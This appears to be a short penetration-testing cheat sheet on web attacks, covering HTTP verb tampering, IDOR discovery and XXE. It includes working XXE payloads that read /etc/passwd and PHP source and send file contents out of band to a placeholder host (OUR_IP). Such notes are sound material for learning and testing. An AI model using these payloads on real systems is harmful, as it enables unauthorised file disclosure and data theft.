title: Web Attacks
html:
Web Attacks

## HTTP Verb Tampering `HTTP Method` - `HEAD` - `PUT` - `DELETE` - `OPTIONS` - `PATCH` | **Command** | **Description** | | --------------|-------------------| | `-X OPTIONS` | Set HTTP Method with Curl | ## IDOR `Identify IDORS` - In `URL parameters & APIs` - In `AJAX Calls` - By `understanding reference hashing/encoding` - By `comparing user roles` | **Command** | **Description** | | --------------|-------------------| | `md5sum` | MD5 hash a string | | `base64` | Base64 encode a string | ## XXE | **Code** | **Description** | | --------------|-------------------| | `<!ENTITY xxe SYSTEM "http://localhost/email.dtd">` | Define External Entity to a URL | | `<!ENTITY xxe SYSTEM "file:///etc/passwd">` | Define External Entity to a file path | | `<!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">` | Read PHP source code with base64 encode filter | | `<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">` | Reading a file through a PHP error | | `<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">` | Reading a file OOB exfiltration |
